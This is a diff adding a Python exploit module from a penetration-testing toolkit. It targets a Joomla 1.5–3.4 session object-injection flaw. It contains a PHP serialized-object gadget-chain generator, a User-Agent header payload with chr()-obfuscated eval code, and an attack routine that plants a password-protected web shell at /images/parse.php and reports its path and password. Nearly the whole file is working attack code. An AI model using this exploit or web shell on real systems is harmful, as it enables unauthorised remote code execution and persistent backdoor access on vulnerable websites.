@@ -1,0 +1,117 @@
+#!/usr/bin/env python
+#-*- coding:utf-8 -*-
+
+'''
+Pentestdb, a database for penetration test.
+Copyright (c) 2015 alpha1e0
+'''
+
+
+from script.libs.exploit import Exploit
+from script.libs.exploit import Result
+
+
+
+'''attack_payload 生成方法:
+<?php
+header("Content-Type: text/plain");
+class JSimplepieFactory {
+}
+class JDatabaseDriverMysql {
+  
+}
+class SimplePie {
+    var $sanitize;
+    var $cache;
+    var $cache_name_function;
+    var $javascript;
+    var $feed_url;
+    function __construct()
+    {
+        $this->feed_url = "phpinfo();JFactory::getConfig();exit;";
+        $this->javascript = 9999;
+        $this->cache_name_function = "assert";
+        $this->sanitize = new JDatabaseDriverMysql();
+        $this->cache = true;
+    }
+}
+  
+class JDatabaseDriverMysqli {
+    protected $a;
+    protected $disconnectHandlers;
+    protected $connection;
+    function __construct()
+    {
+        $this->a = new JSimplepieFactory();
+        $x = new SimplePie();
+        $this->connection = 1;
+        $this->disconnectHandlers = array(array($x,"init"));
+    }
+}
+  
+$a = new JDatabaseDriverMysqli();
+$result = serialize($a);
+$result = str_replace(chr(0).'*'.chr(0), '\x5C0\x5C0\x5C0', $result);
+echo '}__t|'.$result.'\xF0\x9D\x8C\x86';
+?>
+'''
+
+class JoomlaSOI(Exploit):
+    expName = u"Joomla 1.5~3.4 session对象注入漏洞exploit"
+    version = "1.0"
+    author = "alpha1e0"
+    language = "php"
+    appName = "joomla"
+    appVersion = "1.5~3.4"
+    reference = ['http://drops.wooyun.org/papers/11330']
+    description = u'''
+        joomla 1.5~3.4 session 对象注入漏洞，成功利用同时需要PHP < 5.6.13。joomla中session存储在数据库中，其中user-agent，
+        x-forward-for未经过滤存储到数据库中，可在其中插入序列化对象，session_start后自动反序列化触发命令执行
+    '''
+
+    def _verify(self):
+        result = Result(self)
+
+        php_code = '''echo "asdfgh123456";'''
+        attack_payload = self._genPayload(php_code)
+
+        response = self.http.get(self.url, headers={"User-Agent":attack_payload})
+
+        if response.status_code == 200:
+            response = self.http.get(self.url)
+            if response.status_code == 200 and 'asdfgh123456' in response.content:
+                result['fullpath'] = self.url
+                result['payload'] = attack_payload
+
+        return result
+
+
+    def _attack(self):
+        result = Result(self)
+        #php_code = '''print "start-->|";echo __FILE__;'''
+        #php_code = '''print "start-->|";echo getcwd();'''
+        #php_code = '''$s='<?php @eval($_POST["pass"]);?>';$n=dirname(dirname(dirname(__FILE__)))."/images/parse.php";$f=fopen($n,"w");fwrite($f,$s);'''
+        php_code = '''$s='<?php $f=strrev($_GET["f"]);$f($_POST["pass"]);?>';$n=dirname(dirname(dirname(__FILE__)))."/images/parse.php";$f=fopen($n,"w");fwrite($f,$s);'''
+        attack_payload = self._genPayload(php_code)
+
+        response = self.http.get(self.url, headers={"User-Agent":attack_payload})
+        
+        if response.status_code == 200:
+            response = self.http.get(self.url)
+            response = self.http.get(self.urlJoin("/images/parse.php"))
+
+            if response.status_code == 200:
+                result['fullpath'] = self.url
+                result['shellpath'] = "/images/parse.php?f=tressa"
+                result['vulinfo'] = 'shell password: pass'
+
+        return result
+
+
+    def _genPayload(self, raw_payload):
+        template = '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\x5C0\x5C0\x5C0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:%d:"%sJFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\x5C0\x5C0\x5C0connection";b:1;}\xF0\x9D\x8C\x86' 
+        
+        encoded_payload = ".".join(["chr({0})".format(ord(x)) for x in raw_payload])
+        encoded_payload = "eval({0});".format(encoded_payload)
+
+        return template % (27+len(encoded_payload), encoded_payload)
